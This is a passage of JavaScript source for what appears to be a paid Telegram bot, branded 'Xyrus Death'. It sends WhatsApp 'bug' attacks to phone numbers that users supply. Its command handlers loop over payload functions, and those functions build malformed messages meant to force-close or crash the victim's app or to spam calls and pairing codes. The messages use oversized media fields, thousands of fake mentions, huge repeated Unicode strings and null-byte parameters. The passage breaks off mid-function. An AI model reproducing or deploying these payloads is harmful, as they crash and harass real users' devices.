    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Excalibur
ⵢ. Effect Bugs : Force Close Android Click
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 10; i++) {
    await MahizaXtristan(target); 
    await new Promise((r) => setTimeout(r, 1700));
    await MahizaXtristan(target);
    await new Promise((r) => setTimeout(r, 1700));
    await MahizaXtristan(target);   
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Excalibur
ⵢ. Effect Bugs : Force Close Android Click
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

/// ~ Case Bugs 10
bot.onText(/\/Oktagram (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Oktagram
ⵢ. Effect Bugs : Spamm Telepon
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 10; i++) {
    await NayenImup(sock, target); 
    await new Promise((r) => setTimeout(r, 1700));
    await NayenImup(sock, target);
    await new Promise((r) => setTimeout(r, 1700));
    await NayenImup(sock, target);   
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Oktagram
ⵢ. Effect Bugs : Spamm Telepon
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

/// ~ Case Bugs 11
bot.onText(/\/Overlow (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Overlow
ⵢ. Effect Bugs : Spamm Pairing Code
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 10; i++) {
    await SendPairing(sock, jid); 
    await new Promise((r) => setTimeout(r, 1700));
    await SendPairing(sock, jid);
    await new Promise((r) => setTimeout(r, 1700));
    await SendPairing(sock, jid);   
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Overlow
ⵢ. Effect Bugs : Spamm Pairing Code
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

/// ~ Case Bugs 12
bot.onText(/\/Bankai (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Bankai
ⵢ. Effect Bugs : Blank Hard Memek
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 20; i++) {
    await Flowless(target); 
    await new Promise((r) => setTimeout(r, 1700));
    await Flowless(target);
    await new Promise((r) => setTimeout(r, 1700));
    await Flowless(target);   
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Bankai
ⵢ. Effect Bugs : Blank Hard Memek
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

/// ~ Case Bugs 13
bot.onText(/\/Good (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Good
ⵢ. Effect Bugs : Crash Home
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 10; i++) {
    await HellBlankV3(sock, target); 
    await new Promise((r) => setTimeout(r, 1700));
    await HellBlankV3(sock, target);
    await new Promise((r) => setTimeout(r, 1700));
    await HellBlankV3(sock, target);   
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Good
ⵢ. Effect Bugs : Crash Home
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// ------------------ ( Function Disini ) ------------------------ \\
async function InvisibleStc(sock, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`─────「 ⏤!InvisibleSticker To: ${target}!⏤ 」─────`))
}

async function KyziiXZunn(target, sock) {
  try {
    const messageContent = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
            fileLength: "999999999999", 
            height: 999999999, 
            width: 999999999, 
            mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
            fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
            directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1762488513",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABEv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFEETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjosoqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
            caption: "ꦾ".repeat(20000) + "ꦾ".repeat(40000),
            contextInfo: {
              mentionedJid: [
                ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}917267@s.whatsapp.net`), 
              ],
              remoteJid: "status@broadcast",
              isForwarded: true,
              forwardingScore: 999, 
              forwardedNewsletterMessageInfo: {
                newsletterJid: "696969696969@newsletter",
                serverMessageId: 1,
                newsletterName: "BulldozerXHard",
              }
            }
          }
        }
      }
    };
    
    const msg = generateWaMessageFromContent(target, messageContent, {}); 
    
    await sock.relayMessage(target, msg, { 
      messageId: sock.generateMessageID(), 
      participant: sock.user.id, 
    });
  
    console.log(chalk.red("Success Sending")); 
  } catch (error) {
    console.error(chalk.red("Failed to send message:"), error);
  }
}

async function CarouselOtax(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let i = 0; i < 75; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "OTAX" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§OtaxUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    // Pengiriman dengan format yang diminta tanpa mention
    await otax.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}

async function YxGHard(sock, target) {
console.log(chalk.red(`YxG - Sabar Lagi Proses To ${target} Nah Dah`));
const loh = {
viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "YxG - Anti manisan",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000)}  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  
const hayo = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  
const Hard = {
 viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "YxG - Sedang Ngewe",  
            text: permen  
          }  
        },  
        extendedTextMessage: {  
          text: "YxG - Lagi Ngewe Bg".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000)},  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000)}  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  
const jekbut = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "YxG - Hayolo Anak Orang Hamil",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  
const iyakah = {
videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  
const sabar = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
